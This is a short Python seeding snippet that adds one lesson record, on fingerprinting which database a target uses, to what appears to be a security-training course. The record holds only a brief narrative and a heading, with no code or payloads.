    l5_2 = Lesson(module_id=m5.id, order_index=2, title="Identifying the Database (Fingerprinting)", narrative="**Narrative**: *Different databases have different syntax, functions, and metadata tables. The first step is figuring out which database you're dealing with.*\\n**Fingerprinting Techniques**:", code_snippet=None, code_language=None, table_data=None)
    db.session.add(l5_2)
